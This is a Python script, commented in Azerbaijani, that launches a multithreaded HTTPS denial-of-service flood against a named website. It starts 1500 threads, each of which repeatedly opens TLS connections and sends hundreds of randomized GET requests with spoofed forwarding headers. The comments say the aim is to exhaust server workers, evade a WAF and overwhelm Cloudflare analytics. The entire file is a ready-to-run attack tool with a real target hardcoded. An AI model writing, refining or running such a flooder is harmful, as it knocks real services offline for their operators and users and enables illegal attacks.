import socket
import ssl
import threading
import random
import string
import time

# --- MAXIMUM OVERDRIVE ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1500 # Railway Paid üçün maksimal şəbəkə sıxlığı

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def attack():
    # SSL Handshake-i ən baha başa gələn üsulla (RSA-AES) qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket gecikməsini sıfırla
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # HTTP/2 Rapid Reset təqlidi: Bir bağlantıdan minlərlə "yarımçıq" müraciət
            # Bu hədəf serverin Worker process-lərini saniyələr içində bitirir
            for _ in range(500):
                # Hər bir paket serverin RAM-ında yeni bir buffer açır
                path = f"/?q={r_str(50)}&invite_code={random.randint(1000, 9999)}&ttclid={r_str(100)}"
                
                # Malformed Header Strike: Cloudflare analitikasını donduran başlıqlar
                header = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    f"Accept-Encoding: gzip, deflate, br, zstd\r\n"
                    f"Content-Length: 0\r\n" # Fast-reset effekti
                    f"\r\n"
                ).encode()
                
                conn.sendall(header)
                
            # Bağlantını bağlamırıq, serverin onu bağlamasını gözləyirik (Connection Exhaustion)
            time.sleep(1)
            conn.close()
        except:
            pass

def main():
    print(f"💀 SINGULARITY ACTIVATED: {TARGET_HOST}")
    print(f"[*] Deploying {THREADS} threads to bypass Enterprise WAF...")
    
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] Wave {i//100 + 1} launched...")
            time.sleep(0.2)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
